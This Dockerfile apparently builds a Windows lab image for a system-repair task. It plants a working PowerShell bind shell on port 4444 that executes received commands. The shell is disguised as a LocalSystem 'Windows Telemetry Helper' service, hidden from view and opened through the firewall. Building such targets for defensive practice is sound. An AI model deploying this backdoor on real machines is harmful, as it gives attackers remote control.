# syntax=docker/dockerfile:1
# meta3-win-19-rogue-listener-service — Windows service spawning a PowerShell bind shell on 4444/TCP
FROM sysrepair/meta3-win-base:ltsc2019

SHELL ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", "$ErrorActionPreference='Stop';"]

# Plant a PowerShell bind-shell script and register a service that launches it as
# LocalSystem. The script listens on 4444/TCP and pipes stdin/stdout of cmd.exe to
# the socket — a classic backdoor listener.
RUN New-Item -ItemType Directory -Path C:\ProgramData\WinTelemetry -Force | Out-Null ; \
    Set-Content -Path C:\ProgramData\WinTelemetry\svc.ps1 -Value @' \
        $port = 4444 \
        $listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, $port) \
        $listener.Start() \
        while ($true) { \
            $client = $listener.AcceptTcpClient() \
            $stream = $client.GetStream() \
            $reader = [System.IO.StreamReader]::new($stream) \
            $writer = [System.IO.StreamWriter]::new($stream) \
            $writer.AutoFlush = $true \
            while (($cmd = $reader.ReadLine()) -ne $null) { \
                try { $out = Invoke-Expression $cmd | Out-String } catch { $out = $_.Exception.Message } \
                $writer.WriteLine($out) \
            } \
            $client.Close() \
        } \
    '@ ; \
    New-Service -Name 'WinTelemetrySvc' -DisplayName 'Windows Telemetry Helper' \
        -BinaryPathName 'powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\ProgramData\WinTelemetry\svc.ps1' \
        -StartupType Automatic ; \
    New-NetFirewallRule -DisplayName 'WinTelemetry-4444' -Direction Inbound -Protocol TCP -LocalPort 4444 -Action Allow

COPY verify.ps1 C:/verify/verify.ps1

EXPOSE 4444 22 5985
CMD ["powershell", "-NoProfile", "-Command", "Start-Service sshd; Start-Service WinRM; Start-Service WinTelemetrySvc -ErrorAction SilentlyContinue; while ($true) { Start-Sleep 60 }"]
